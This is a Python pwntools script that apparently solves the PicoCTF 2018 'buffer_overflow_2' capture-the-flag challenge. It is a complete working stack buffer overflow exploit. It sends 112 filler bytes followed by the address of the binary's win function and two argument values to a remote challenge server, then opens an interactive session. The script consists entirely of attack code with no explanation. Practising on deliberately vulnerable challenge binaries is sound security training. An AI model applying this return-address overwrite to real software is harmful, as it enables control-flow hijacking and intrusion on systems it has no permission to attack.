from pwn import*
elf=ELF('./PicoCTF_2018_buffer_overflow_2')
p=remote('node4.buuoj.cn',28550)
#p=process('./PicoCTF_2018_buffer_overflow_2')
win=elf.symbols['win']
payload=b'a'*112+p32(win)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)

p.sendline(payload)
p.interactive()